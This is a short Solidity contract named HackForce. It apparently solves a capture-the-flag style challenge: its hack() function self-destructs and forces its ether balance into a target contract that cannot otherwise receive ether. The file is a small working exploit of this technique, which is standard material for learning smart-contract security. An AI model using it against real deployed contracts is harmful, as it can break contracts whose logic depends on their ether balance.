// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract HackForce {
    address payable targetContract;

    constructor(address payable _targetContract) public {
        targetContract = _targetContract;
    }

    function hack() public {
        selfdestruct(targetContract);
    }

    receive() external payable {
        require(msg.value > 0);
    }
}
